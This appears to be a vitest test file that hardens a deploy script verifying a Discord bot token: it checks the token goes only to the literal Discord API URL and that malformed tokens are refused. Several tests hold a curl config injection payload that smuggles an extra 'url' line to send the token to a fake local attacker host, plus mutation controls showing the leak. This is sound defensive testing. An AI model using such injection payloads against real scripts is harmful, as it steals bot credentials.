/**
 * .github/scripts/verify-discord-bot-identity.sh: the REQUIRED-mode half of the deploy smoke step. Two hardening
 * rules are pinned here, each against the real script and the real step text from deploy.yml:
 *
 * 1. The bot token is only ever sent to the literal https://discord.com/api/v10. The API base is an argument the
 *    workflow spells out, never a runner environment variable, so a `DISCORD_API_BASE` set on the runner cannot
 *    redirect the token.
 * 2. The token reaches curl as a `-K -` config line. A token holding a double quote plus a newline would close
 *    the quoted value and add config lines (a second `url`, an `output` path), so the script refuses any token
 *    with a quote, backslash or control character BEFORE building the config, without printing it.
 *
 * The error cases assert on the script's own message AND on what the fake servers saw, so a check that is
 * removed shows up as a request that should never have been made.
 */
import { readFileSync } from 'node:fs';
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import {
  BOT_IDENTITY_SCRIPT,
  DISCORD_API_BASE_LITERAL,
  REPO_ROOT,
  runBotIdentityScript,
  runSmokeStep,
  smokeIdentityStep,
} from './testkit/compose-render.js';

const IS_WINDOWS = process.platform === 'win32';
const TOKEN = 'T'.repeat(60);

const servers: Server[] = [];
afterEach(async () => {
  await Promise.all(servers.splice(0).map((s) => new Promise((done) => s.close(done))));
});

interface Recorder {
  base: string;
  /** `${url} ${authorization}` of every request the server received. */
  requests: string[];
}

/** A fake Discord (and, when used twice, a fake attacker host). It answers /users/@me with a good bot user. */
async function host(): Promise<Recorder> {
  const requests: string[] = [];
  const server = createServer((req, res) => {
    requests.push(`${req.url} ${req.headers.authorization}`);
    res.writeHead(200, { 'content-type': 'application/json' }).end('{"id":"1","bot":true}');
  });
  servers.push(server);
  await new Promise<void>((ready) => server.listen(0, '127.0.0.1', ready));
  return { base: `http://127.0.0.1:${(server.address() as AddressInfo).port}`, requests };
}

const REFUSAL = 'refusing to build the curl config';

describe.skipIf(IS_WINDOWS)('verify-discord-bot-identity.sh: token validation', () => {
  for (const prefix of ['', 'Bot ']) {
    it(`accepts a good token${prefix === '' ? '' : ' with the "Bot " prefix'} and sends one Bot credential`, async () => {
      const discord = await host();
      const r = await runBotIdentityScript({ DISCORD_TOKEN: `${prefix}${TOKEN}` }, discord.base);
      expect(r.stderr).toBe('');
      expect(r.status).toBe(0);
      expect(r.stdout).toContain('bot identity confirmed directly against Discord');
      expect(discord.requests).toEqual([`/users/@me Bot ${TOKEN}`]);
    });
  }

  const BAD_TOKENS: [string, string][] = [
    ['a double quote', `${TOKEN}"`],
    ['a backslash', `${TOKEN}\\`],
    ['a carriage return', `${TOKEN}\rX`],
    ['a line feed', `${TOKEN}\nX`],
    ['a tab', `${TOKEN}\tX`],
    ['a DEL character', `${TOKEN}\x7fX`],
    ['a trailing newline', `${TOKEN}\n`],
    ['a "Bot " prefix and a quote', `Bot ${TOKEN}"`],
  ];
  for (const [what, token] of BAD_TOKENS) {
    it(`refuses a token containing ${what}, before any request, without printing it`, async () => {
      const discord = await host();
      const r = await runBotIdentityScript({ DISCORD_TOKEN: token }, discord.base);
      expect(r.status).not.toBe(0);
      expect(r.stderr + r.stdout).toContain(REFUSAL);
      expect(r.stdout + r.stderr).not.toContain(TOKEN);
      expect(discord.requests).toEqual([]);
    });
  }

  it('refuses the curl config injection (quote + newline + url line): the attacker host is never contacted', async () => {
    const discord = await host();
    const attacker = await host();
    const payload = `${TOKEN}"\nurl = "${attacker.base}/steal"\nheader = "X-Pad: 1`;
    const r = await runBotIdentityScript({ DISCORD_TOKEN: payload }, discord.base);
    expect(r.status).not.toBe(0);
    expect(r.stderr + r.stdout).toContain(REFUSAL);
    expect(r.stdout + r.stderr).not.toContain(TOKEN);
    expect(attacker.requests).toEqual([]);
    expect(discord.requests).toEqual([]);
  });

  for (const [what, token] of [
    ['empty', ''],
    ['only the "Bot " prefix', 'Bot '],
  ] as const) {
    it(`refuses a token that is ${what}`, async () => {
      const discord = await host();
      const r = await runBotIdentityScript({ DISCORD_TOKEN: token }, discord.base);
      expect(r.status).not.toBe(0);
      expect(r.stderr + r.stdout).toContain('DISCORD_TOKEN is empty');
      expect(discord.requests).toEqual([]);
    });
  }

  it('mutation control: with the validation removed the same payload DOES reach the attacker host (the spec can fail)', async () => {
    const discord = await host();
    const attacker = await host();
    const script = readFileSync(join(REPO_ROOT, BOT_IDENTITY_SCRIPT), 'utf8');
    const mutated = script.replace(/if \[\[ \$token == [\s\S]*?\nfi\n/, '');
    expect(mutated).not.toBe(script);
    expect(mutated).not.toContain(REFUSAL);
    const payload = `${TOKEN}"\nurl = "${attacker.base}/steal"\nheader = "X-Pad: 1`;
    await runBotIdentityScript({ DISCORD_TOKEN: payload }, discord.base, mutated);
    expect(attacker.requests.length).toBeGreaterThan(0);
  });

  it('ignores a DISCORD_API_BASE in its environment: the base is the argument only', async () => {
    const legit = await host();
    const attacker = await host();
    const r = await runBotIdentityScript(
      { DISCORD_TOKEN: TOKEN, DISCORD_API_BASE: attacker.base },
      legit.base,
    );
    expect(r.status).toBe(0);
    expect(legit.requests).toEqual([`/users/@me Bot ${TOKEN}`]);
    expect(attacker.requests).toEqual([]);
  });
});

describe.skipIf(IS_WINDOWS)('deploy smoke step: the Discord host', () => {
  const step = (): string => smokeIdentityStep()?.run ?? '';

  it('spells the Discord API host out once, as a literal, and never reads it from the environment', () => {
    expect(step().split(DISCORD_API_BASE_LITERAL).length - 1).toBe(1);
    expect(step()).not.toContain('DISCORD_API_BASE');
    // The only https URL the step can contact is the literal (the loopback origin is http).
    expect(step().match(/https:\/\/[^\s'"]+/g)).toEqual([DISCORD_API_BASE_LITERAL]);
    expect(step()).toContain(`bash -s -- '${DISCORD_API_BASE_LITERAL}'`);
  });

  it('a DISCORD_API_BASE set on the runner does not redirect the bot token (end to end through the real step)', async () => {
    const legit = await host();
    const attacker = await host();
    // The REQUIRED path first asks the MCP origin for an anonymous refusal.
    const mcp = createServer((req, res) => {
      req.resume();
      res
        .writeHead(401, { 'content-type': 'application/json' })
        .end('{"error":"studio_credential_required"}');
    });
    servers.push(mcp);
    await new Promise<void>((ready) => mcp.listen(0, '127.0.0.1', ready));
    const r = await runSmokeStep({
      HOST_PORT: String((mcp.address() as AddressInfo).port),
      STUDIO_AUTH_REQUIRED: 'true',
      DISCORD_TOKEN: TOKEN,
      DISCORD_API_BASE: attacker.base,
      TEST_DISCORD_BASE: legit.base,
    });
    expect(r.status).toBe(0);
    expect(legit.requests).toEqual([`/users/@me Bot ${TOKEN}`]);
    expect(attacker.requests).toEqual([]);
  });

  // biome-ignore lint/suspicious/noTemplateCurlyInString: the title quotes a shell expression, not a JS template
  it('mutation control: the pre-fix expression (`${DISCORD_API_BASE:-host}`) WOULD send the token to the runner-supplied host', async () => {
    const attacker = await host();
    const legit = await host();
    const mcp = createServer((req, res) => {
      req.resume();
      res
        .writeHead(401, { 'content-type': 'application/json' })
        .end('{"error":"studio_credential_required"}');
    });
    servers.push(mcp);
    await new Promise<void>((ready) => mcp.listen(0, '127.0.0.1', ready));
    // Replay the old curl line against the real script: the base the script is handed is what the old step built.
    const script = readFileSync(join(REPO_ROOT, BOT_IDENTITY_SCRIPT), 'utf8').replace(
      // biome-ignore lint/suspicious/noTemplateCurlyInString: shell text, not a JS template
      '"${base}/users/@me"',
      // biome-ignore lint/suspicious/noTemplateCurlyInString: shell text, not a JS template
      '"${DISCORD_API_BASE:-${base}}/users/@me"',
    );
    expect(script).toContain('DISCORD_API_BASE');
    await runBotIdentityScript(
      { DISCORD_TOKEN: TOKEN, DISCORD_API_BASE: attacker.base },
      legit.base,
      script,
    );
    expect(attacker.requests).toEqual([`/users/@me Bot ${TOKEN}`]);
  });
});
